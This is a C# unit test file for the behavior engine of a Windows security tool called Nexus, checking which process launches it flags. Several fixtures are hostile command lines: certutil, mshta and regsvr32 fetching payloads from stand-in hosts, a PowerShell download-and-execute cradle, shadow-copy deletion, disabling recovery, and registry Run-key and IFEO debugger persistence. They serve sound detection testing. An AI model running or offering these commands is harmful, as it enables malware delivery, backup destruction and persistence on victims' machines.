using Nexus.Core.Security;
using Nexus.Core.Security.Behavior;
using Xunit;

namespace Nexus.Core.Tests;

public class BehaviorEngineTests
{
    private static readonly DateTimeOffset Now = new(2026, 8, 30, 12, 0, 0, TimeSpan.Zero);

    private static ProcessStartEvent Launch(
        string imagePath,
        string commandLine = "",
        string parentImagePath = "",
        int pid = 1000,
        int parentPid = 900) =>
        new()
        {
            Pid = pid,
            ParentPid = parentPid,
            ImagePath = imagePath,
            CommandLine = commandLine,
            ParentImagePath = parentImagePath,
            At = Now,
        };

    private static string[] CodesFor(ProcessStartEvent evt) =>
        new BehaviorEngine().Observe(evt)?.Signals.Select(s => s.Code).ToArray() ?? [];

    [Fact]
    public void An_ordinary_launch_produces_no_finding()
    {
        Assert.Null(new BehaviorEngine().Observe(
            Launch(@"C:\Program Files\Git\bin\git.exe", "git status", @"C:\Windows\System32\cmd.exe")));
    }

    [Fact]
    public void System_binaries_in_their_real_home_are_not_flagged()
    {
        Assert.DoesNotContain("beh-masquerade", CodesFor(Launch(@"C:\Windows\System32\svchost.exe", "-k netsvcs")));
        Assert.DoesNotContain("beh-masquerade", CodesFor(Launch(@"C:\Windows\explorer.exe")));
    }

    [Fact]
    public void SysWOW64_counts_as_home_for_System32_binaries()
    {
        Assert.DoesNotContain("beh-masquerade", CodesFor(Launch(@"C:\Windows\SysWOW64\rundll32.exe")));
    }

    /// <summary>The hole in name-based trust: this is the case an exe-name allowlist
    /// would wave straight through.</summary>
    [Fact]
    public void A_system_name_running_from_elsewhere_is_flagged_as_masquerading()
    {
        var codes = CodesFor(Launch(@"C:\Users\fadi\AppData\Local\Temp\svchost.exe"));
        Assert.Contains("beh-masquerade", codes);
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\certutil.exe", "certutil -urlcache -split -f http://x/a.exe", "beh-lolbin-certutil")]
    [InlineData(@"C:\Windows\System32\mshta.exe", "mshta http://evil/a.hta", "beh-lolbin-mshta")]
    [InlineData(@"C:\Windows\System32\regsvr32.exe", "regsvr32 /s /i:http://x/a.sct scrobj.dll", "beh-lolbin-regsvr32")]
    [InlineData(@"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all /quiet", "beh-lolbin-vssadmin")]
    [InlineData(@"C:\Windows\System32\bcdedit.exe", "bcdedit /set recoveryenabled no", "beh-lolbin-bcdedit")]
    public void Known_abuse_patterns_are_reported(string image, string commandLine, string expectedCode)
    {
        Assert.Contains(expectedCode, CodesFor(Launch(image, commandLine)));
    }

    [Fact]
    public void The_same_binary_used_normally_is_not_reported()
    {
        Assert.Empty(CodesFor(Launch(@"C:\Windows\System32\certutil.exe", "certutil -hashfile setup.iso SHA256")));
        Assert.Empty(CodesFor(Launch(@"C:\Windows\System32\net.exe", "net use z: \\\\server\\share")));
    }

    [Fact]
    public void Shadow_copy_deletion_is_decisive_on_its_own()
    {
        var finding = new BehaviorEngine().Observe(
            Launch(@"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all /quiet"));

        Assert.NotNull(finding);
        Assert.Equal(SignalWeight.Decisive, finding.Severity);
    }

    [Fact]
    public void A_document_spawning_a_shell_is_reported()
    {
        var codes = CodesFor(Launch(
            @"C:\Windows\System32\cmd.exe",
            "cmd /c powershell -w hidden",
            @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"));

        Assert.Contains("beh-document-spawned-shell", codes);
    }

    [Fact]
    public void A_developer_tool_spawning_a_shell_is_not_reported()
    {
        var codes = CodesFor(Launch(
            @"C:\Windows\System32\cmd.exe", "cmd /c build.bat", @"C:\Program Files\Git\bin\git.exe"));

        Assert.DoesNotContain("beh-document-spawned-shell", codes);
    }

    [Fact]
    public void Running_from_temp_is_only_weak_evidence()
    {
        var finding = new BehaviorEngine().Observe(
            Launch(@"C:\Users\fadi\AppData\Local\Temp\setup.exe"));

        Assert.NotNull(finding);
        Assert.Equal(SignalWeight.Weak, finding.Severity);
    }

    [Fact]
    public void Only_one_location_signal_is_emitted_per_launch()
    {
        var codes = CodesFor(Launch(@"C:\Users\fadi\AppData\Local\Temp\Downloads\a.exe"));
        Assert.Single(codes, c => c == "beh-unusual-location");
    }

    [Fact]
    public void Encoded_powershell_command_lines_are_reported()
    {
        var codes = CodesFor(Launch(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"));

        Assert.Contains("beh-lolbin-powershell-encoded", codes);
        Assert.Contains("beh-encoded-commandline", codes);
    }

    /// <summary>
    /// The command line Nexus itself uses to query Defender and enumerate scheduled
    /// tasks. Every installer and build script on earth looks like this, so if it
    /// reaches the alert threshold the feature is noise — and Nexus was reporting its
    /// own helper processes as strongly suspicious.
    /// </summary>
    [Fact]
    public void An_ordinary_noprofile_bypass_invocation_does_not_reach_an_alert()
    {
        var finding = new BehaviorEngine().Observe(Launch(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Get-MpComputerStatus\""));

        Assert.NotNull(finding);

        var verdict = VerdictEngine.Evaluate(new VerdictInput
        {
            Target = finding.Target,
            Signals = finding.Signals,
            EnginesConsulted = new HashSet<SignalSource> { SignalSource.Behavior },
        }, Now);

        Assert.False(verdict.WarrantsAlert,
            $"an ordinary -NoProfile/-Bypass launch reached {verdict.Level} at {verdict.Score}/100");
    }

    [Theory]
    [InlineData("powershell -NoProfile -Command Get-Date", "beh-lolbin-powershell-policy", SignalWeight.Weak)]
    [InlineData("powershell -w hidden -Command Start-Thing", "beh-lolbin-powershell-hidden", SignalWeight.Moderate)]
    [InlineData("powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://x')\"",
        "beh-lolbin-powershell-encoded", SignalWeight.Strong)]
    public void Powershell_is_graded_by_what_the_command_line_actually_does(
        string commandLine, string expectedCode, SignalWeight expectedWeight)
    {
        var finding = new BehaviorEngine().Observe(
            Launch(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", commandLine));

        Assert.NotNull(finding);
        var signal = Assert.Single(finding.Signals, s => s.Code == expectedCode);
        Assert.Equal(expectedWeight, signal.Weight);
    }

    [Theory]
    [InlineData("powershell -Command Get-Process", false)]
    [InlineData(@"C:\Program Files\App\app.exe --config C:\ProgramData\App\settings.json", false)]
    [InlineData("app.exe -d TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAA", true)]
    public void Base64_detection_ignores_ordinary_command_lines(string commandLine, bool expected)
    {
        Assert.Equal(expected, BehaviorEngine.LooksBase64Encoded(commandLine, out _));
    }

    [Theory]
    [InlineData("invoice.pdf.exe", true)]
    [InlineData("photo.jpg.scr", true)]
    [InlineData("archive.zip.js", true)]
    [InlineData("setup.exe", false)]
    [InlineData("my.company.installer.exe", false)]
    public void Deceptive_double_extensions_are_detected(string fileName, bool expected)
    {
        Assert.Equal(expected, BehaviorEngine.HasDeceptiveDoubleExtension(fileName, out _));
    }

    /// <summary>
    /// Nexus creates its autostart entry with schtasks and queries Defender with
    /// PowerShell, both of which match rules here. Before this, switching on "start
    /// with Windows" made Nexus raise a security alert about itself.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\schtasks.exe",
        "schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN \"Nexus Optimizer\" /TR \"C:\\Nexus\\Nexus.exe\"")]
    [InlineData(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell -NoProfile -ExecutionPolicy Bypass -Command Get-MpComputerStatus")]
    public void Helpers_that_nexus_itself_launches_are_marked_not_accused(string image, string commandLine)
    {
        var finding = new BehaviorEngine().Observe(
            Launch(image, commandLine, parentImagePath: @"C:\Program Files\Nexus\Nexus.exe"));

        Assert.NotNull(finding);

        // Reported, not hidden — the same choice the startup audit makes about Nexus's
        // own registry keys.
        var signal = Assert.Single(finding.Signals);
        Assert.Equal("beh-nexus-own-helper", signal.Code);
        Assert.Equal(SignalWeight.Informational, signal.Weight);
        Assert.Equal(0, signal.Points);
    }

    /// <summary>
    /// `reg export` reads; `reg add` writes. Reporting a backup as persistence is
    /// simply wrong, and Nexus's own tweak backups export Image File Execution
    /// Options keys before touching them.
    /// </summary>
    [Fact]
    public void Exporting_a_startup_key_is_not_reported_as_writing_to_it()
    {
        var codes = CodesFor(Launch(
            @"C:\Windows\System32\reg.exe",
            @"reg export ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\game.exe"" backup.reg"));

        Assert.DoesNotContain("beh-lolbin-reg-ifeo", codes);
        Assert.DoesNotContain("beh-lolbin-reg-run-key", codes);
    }

    [Theory]
    [InlineData(@"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v x /d y", "beh-lolbin-reg-run-key")]
    [InlineData(@"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"" /v Debugger /d evil.exe", "beh-lolbin-reg-ifeo")]
    public void Writing_to_a_startup_or_debugger_key_is_reported(string commandLine, string expected)
    {
        Assert.Contains(expected, CodesFor(Launch(@"C:\Windows\System32\reg.exe", commandLine)));
    }

    /// <summary>A rule needing every pattern must not fire on one of them.</summary>
    [Fact]
    public void A_require_all_rule_does_not_fire_on_a_partial_match()
    {
        Assert.DoesNotContain("beh-lolbin-reg-run-key",
            CodesFor(Launch(@"C:\Windows\System32\reg.exe", @"reg add ""HKCU\Software\Vendor\Settings"" /v x /d y")));
    }

    [Fact]
    public void The_same_command_from_anything_else_is_still_reported_normally()
    {
        var finding = new BehaviorEngine().Observe(Launch(
            @"C:\Windows\System32\schtasks.exe",
            "schtasks /Create /SC ONLOGON /TN Updater /TR C:\\Users\\x\\AppData\\Roaming\\u.exe",
            parentImagePath: @"C:\Users\x\AppData\Local\Temp\dropper.exe"));

        Assert.NotNull(finding);
        Assert.Contains(finding.Signals, s => s.Code == "beh-lolbin-schtasks");
    }

    [Fact]
    public void Ancestry_is_reconstructed_across_exited_parents()
    {
        var engine = new BehaviorEngine();
        engine.Observe(Launch(@"C:\Program Files\Office\WINWORD.EXE", pid: 100, parentPid: 10));
        engine.Observe(Launch(@"C:\Windows\System32\cmd.exe", pid: 200, parentPid: 100));
        engine.Observe(Launch(@"C:\Windows\System32\powershell.exe", pid: 300, parentPid: 200));

        Assert.Equal(["powershell.exe", "cmd.exe", "WINWORD.EXE"], engine.AncestryOf(300));
    }

    [Fact]
    public void Forgotten_processes_leave_the_ancestry_map()
    {
        var engine = new BehaviorEngine();
        engine.Observe(Launch(@"C:\Windows\System32\cmd.exe", pid: 200, parentPid: 100));
        engine.Forget(200);

        Assert.Empty(engine.AncestryOf(200));
    }

    [Fact]
    public void Ancestry_terminates_even_if_pid_reuse_creates_a_cycle()
    {
        var engine = new BehaviorEngine();
        engine.Observe(Launch(@"C:\a.exe", pid: 10, parentPid: 20));
        engine.Observe(Launch(@"C:\b.exe", pid: 20, parentPid: 10));

        Assert.Equal(2, engine.AncestryOf(10).Count);
    }

    [Fact]
    public void Process_tracking_is_bounded()
    {
        var engine = new BehaviorEngine();
        for (int i = 1; i <= BehaviorEngine.MaxTrackedProcesses + 500; i++)
            engine.Observe(Launch(@"C:\Program Files\App\app.exe", pid: i, parentPid: 0));

        // The earliest PIDs must have been evicted rather than retained forever.
        Assert.Empty(engine.AncestryOf(1));
        Assert.NotEmpty(engine.AncestryOf(BehaviorEngine.MaxTrackedProcesses + 500));
    }
}
